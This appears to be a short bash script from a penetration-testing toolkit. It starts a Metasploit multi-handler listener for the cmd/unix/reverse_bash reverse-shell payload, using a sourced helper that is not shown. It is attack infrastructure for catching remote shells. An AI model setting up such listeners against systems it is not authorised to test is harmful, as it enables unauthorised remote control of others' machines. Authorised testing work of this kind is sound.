#!/bin/bash

: '
meterpreter: start meterpreter listener cmd/unix/reverse_bash
'

source ${SCRIPTS_DIR}/shell/msfconsole/.files/listen_to_meterpreter_rev_shell.sh

PAYLOAD="cmd/unix/reverse_bash"

create_meterpreter_multi_handler "${PAYLOAD}"
